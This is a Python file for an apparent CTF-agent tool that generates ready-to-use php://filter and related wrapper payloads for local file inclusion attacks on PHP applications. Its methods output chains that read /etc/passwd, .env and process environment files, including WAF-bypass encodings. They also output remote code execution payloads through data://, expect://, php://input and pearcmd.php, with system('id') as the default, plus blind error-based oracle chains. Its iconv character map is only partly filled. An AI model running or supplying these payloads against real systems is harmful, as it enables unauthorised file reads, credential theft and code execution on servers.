"""
PHP filter chain tools for CTF solving.

Generates php://filter chains for arbitrary file read (error-based oracle)
and RCE (write arbitrary PHP code). This was THE dominant PHP technique in
2023 CTFs.

Ref: Synacktiv "PHP filter chains" research, N1CTF 2023 Laravel.
"""

import json
from typing import Dict, List, Optional


class PhpFilterChainTool:
    """
    PhpFilterChainTool: generate php://filter chains for file read and RCE.

    Pure logic tool — no HTTP session required.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "file_read",
          "file": "/etc/passwd",
          "encoding": "base64",
          "wrappers": ["convert.iconv"]
        }

    Operations:
      - file_read: Generate filter chains for reading files
      - rce: Generate filter chains for writing/executing PHP code
      - oracle: Generate error-based oracle chains for blind file read
      - reference: List all PHP stream wrappers and filters
    """

    name: str = "php_filter_chain"
    description: str = (
        "Generate php://filter chains for file read and RCE. Input must be JSON with "
        "'operation' (file_read, rce, oracle, reference). For file_read: optional "
        "'file' (target file path, default /etc/passwd), 'encoding' (base64/rot13/utf). "
        "For rce: optional 'payload' (PHP code to inject). For oracle: optional 'file' "
        "(target file). Returns ready-to-use php://filter chains for LFI exploitation."
    )

    VALID_OPERATIONS = {"file_read", "rce", "oracle", "reference"}

    # Base64 alphabet for iconv chain generation
    BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

    # Standard encoding chains for each base64 character (Synacktiv technique)
    # These use convert.iconv filters to generate specific base64 characters
    ICONV_CHAIN_MAP: Dict[str, List[str]] = {
        # Commonly used characters in PHP payloads
        "P": ["convert.iconv.UTF8.CSISO2022KR", "convert.iconv.ISO2022KR.UTF16"],
        "D": ["convert.iconv.UTF8.UTF7", "convert.iconv.UTF7.UTF8"],
        "9": ["convert.iconv.UTF8.CSISO2022KR"],
        "w": ["convert.iconv.UTF8.CSISO2022KR", "convert.iconv.ISO-IR-111.ECMA-CYRILLIC"],
    }

    def _generate_file_read_chains(
        self, file: str, encoding: str
    ) -> str:
        lines = [
            f"=== PHP Filter Chains for File Read ===",
            f"Target: {file}",
            f"Encoding: {encoding}",
            "",
            "--- Basic Chains ---",
            "",
            f"1. Base64 encode (most common):",
            f"   php://filter/convert.base64-encode/resource={file}",
            "",
            f"2. ROT13 encode:",
            f"   php://filter/string.rot13/resource={file}",
            "",
            f"3. UTF-8 to UTF-16 (triggers error with file contents):",
            f"   php://filter/convert.iconv.utf-8.utf-16/resource={file}",
            "",
            f"4. Quoted-printable encode:",
            f"   php://filter/convert.quoted-printable-encode/resource={file}",
            "",
            "--- Chained Filters (bypass WAF) ---",
            "",
            f"5. Double base64 encode:",
            f"   php://filter/convert.base64-encode|convert.base64-encode/resource={file}",
            "",
            f"6. ROT13 + base64:",
            f"   php://filter/string.rot13|convert.base64-encode/resource={file}",
            "",
            f"7. UTF-7 conversion (exotic encoding bypass):",
            f"   php://filter/convert.iconv.UTF-8.UTF-7/resource={file}",
            "",
            f"8. Zlib compression + base64:",
            f"   php://filter/zlib.deflate|convert.base64-encode/resource={file}",
            "",
            "--- iconv Chain Technique (Synacktiv) ---",
            "",
            "9. Latin1 to UCS4 (reveals binary data):",
            f"   php://filter/convert.iconv.ISO-8859-1.UCS-4LE/resource={file}",
            "",
            "10. UTF-16BE to UTF-8 (null byte stripping):",
            f"    php://filter/convert.iconv.UTF-16BE.UTF-8/resource={file}",
            "",
            "--- Common Target Files ---",
            "",
            "  /etc/passwd",
            "  /flag.txt",
            "  /flag",
            "  /app/flag.txt",
            "  /var/www/html/flag.php",
            "  /var/www/html/index.php",
            "  /var/www/html/config.php",
            "  /var/www/html/.env",
            "  /proc/self/environ",
            "  /proc/self/cmdline",
        ]
        return "\n".join(lines)

    def _generate_rce_chains(self, payload: str) -> str:
        lines = [
            "=== PHP Filter Chains for RCE ===",
            f"Payload: {payload}",
            "",
            "--- Technique 1: iconv Filter Chain RCE (Synacktiv) ---",
            "",
            "The Synacktiv technique generates arbitrary PHP code character-by-character",
            "using chained convert.iconv filters. Each filter converts a known input",
            "into a specific base64 character, building up a base64-encoded PHP payload.",
            "",
            "Steps:",
            "1. Start with a known byte sequence (empty resource + filters)",
            "2. Chain iconv filters to generate base64 of your PHP payload",
            "3. Add convert.base64-decode at the end to decode into PHP",
            "4. The final filter chain, when included, executes the PHP code",
            "",
            f"For payload: {payload}",
            "",
            "Use the Synacktiv tool: https://github.com/synacktiv/php_filter_chain_generator",
            "",
            "Example command:",
            f'  python3 php_filter_chain_generator.py --chain \'<?php {payload} ?>\'',
            "",
            "--- Technique 2: data:// Wrapper (simpler, often blocked) ---",
            "",
            f"  data://text/plain,<?php {payload} ?>",
            f"  data://text/plain;base64,{self._pseudo_base64(payload)}",
            "",
            "--- Technique 3: expect:// Wrapper (if enabled) ---",
            "",
            f"  expect://id",
            f"  expect://{payload}",
            "",
            "--- Technique 4: input:// Wrapper (with POST body) ---",
            "",
            f"  php://input",
            f"  POST body: <?php {payload} ?>",
            "",
            "--- Technique 5: Pearcmd.php (PHP Pear auto-installed) ---",
            "",
            "  /usr/local/lib/php/pearcmd.php",
            "  Params: +config-create+/&file=/usr/local/lib/php/pearcmd.php",
            f'  +install+--installroot+/tmp+channel://pear.php.net/{payload}',
        ]
        return "\n".join(lines)

    def _generate_oracle_chains(self, file: str) -> str:
        lines = [
            "=== Error-Based Oracle Filter Chains ===",
            f"Target: {file}",
            "",
            "This technique uses iconv filter errors to leak file contents",
            "character by character through error messages.",
            "",
            "--- Technique: iconv Error Oracle ---",
            "",
            "1. Use a chain that errors on specific byte values:",
            f"   php://filter/convert.iconv.UTF-8.CSISO2022KR|"
            f"convert.iconv.ISO2022KR.UTF-16|"
            f"convert.base64-decode|"
            f"convert.base64-encode/resource={file}",
            "",
            "2. The error message contains partial file content.",
            "3. Iterate with different iconv combinations to extract more bytes.",
            "",
            "--- Dechunk Oracle (PHP 7.4+) ---",
            "",
            f"php://filter/dechunk/resource={file}",
            "",
            "If the file starts with a hex digit, dechunk interprets it as",
            "chunk-encoded data and the error reveals content structure.",
            "",
            "--- Charset-Based Binary Oracle ---",
            "",
            "1. Convert to single-byte then test specific value ranges:",
            f"   php://filter/convert.iconv.UTF-8.ISO-8859-1|"
            f"convert.iconv.ISO-8859-1.UTF-32LE/resource={file}",
            "",
            "2. Different errors for different byte values reveal content.",
            "",
            "--- Practical Approach ---",
            "",
            "1. First try basic base64 read (fastest)",
            "2. If base64/rot13 blocked, try double encoding",
            "3. If all standard encodings blocked, use iconv oracle",
            "4. Extract character by character via error differences",
        ]
        return "\n".join(lines)

    def _generate_reference(self) -> str:
        lines = [
            "=== PHP Stream Wrappers & Filters Reference ===",
            "",
            "--- Stream Wrappers ---",
            "  php://filter   - Apply filter chains to streams",
            "  php://input    - Read POST body as stream",
            "  php://stdin    - Read from stdin",
            "  php://memory   - In-memory stream",
            "  php://temp     - Temp file stream",
            "  data://        - Data URI scheme",
            "  expect://      - Execute command (if expect extension enabled)",
            "  zip://         - Read from ZIP archives",
            "  phar://        - Read from PHAR archives",
            "  compress.zlib://  - Zlib compressed stream",
            "  compress.bzip2:// - Bzip2 compressed stream",
            "  glob://        - Pattern matching (directory listing)",
            "",
            "--- Available Filters ---",
            "",
            "String filters:",
            "  string.rot13",
            "  string.toupper",
            "  string.tolower",
            "  string.strip_tags",
            "",
            "Conversion filters:",
            "  convert.base64-encode",
            "  convert.base64-decode",
            "  convert.quoted-printable-encode",
            "  convert.quoted-printable-decode",
            "  convert.iconv.{from}.{to}",
            "",
            "Compression filters:",
            "  zlib.deflate",
            "  zlib.inflate",
            "  bzip2.compress",
            "  bzip2.decompress",
            "",
            "Special filters (PHP 7.4+):",
            "  dechunk     - HTTP dechunking (useful for oracle attacks)",
            "  consumed    - Track bytes consumed",
            "",
            "--- Common iconv Encodings ---",
            "  UTF-8, UTF-7, UTF-16, UTF-16BE, UTF-16LE, UTF-32",
            "  ISO-8859-1, ISO-8859-15, WINDOWS-1252",
            "  UCS-2, UCS-2BE, UCS-4, UCS-4LE",
            "  CSISO2022KR, ISO-2022-KR",
            "  ISO-IR-111, ECMA-CYRILLIC",
            "",
            "--- Filter Chain Syntax ---",
            "  php://filter/{filter1}|{filter2}|{filterN}/resource={file}",
            "  php://filter/read={filter}/resource={file}",
            "  php://filter/write={filter}/resource={file}",
        ]
        return "\n".join(lines)

    @staticmethod
    def _pseudo_base64(payload: str) -> str:
        """Simple placeholder — in real use, base64 encode the PHP payload."""
        import base64
        full = f"<?php {payload} ?>"
        return base64.b64encode(full.encode()).decode()

    def use(self, tool_input: str) -> str:
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[PhpFilterChainTool] Error: Invalid JSON. {exc}"

        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[PhpFilterChainTool] Error: 'operation' required. "
                f"Valid: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[PhpFilterChainTool] Error: Unknown operation '{operation}'. "
                f"Valid: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )

        file = data.get("file", "/etc/passwd")
        encoding = data.get("encoding", "base64")
        payload = data.get("payload", "system('id');")

        lines = [
            "[PhpFilterChainTool] PHP Filter Chain Payloads",
            "=" * 50,
            f"Operation: {operation}",
            "",
        ]

        if operation == "file_read":
            lines.append(self._generate_file_read_chains(file, encoding))
        elif operation == "rce":
            lines.append(self._generate_rce_chains(payload))
        elif operation == "oracle":
            lines.append(self._generate_oracle_chains(file))
        elif operation == "reference":
            lines.append(self._generate_reference())

        return "\n".join(lines)
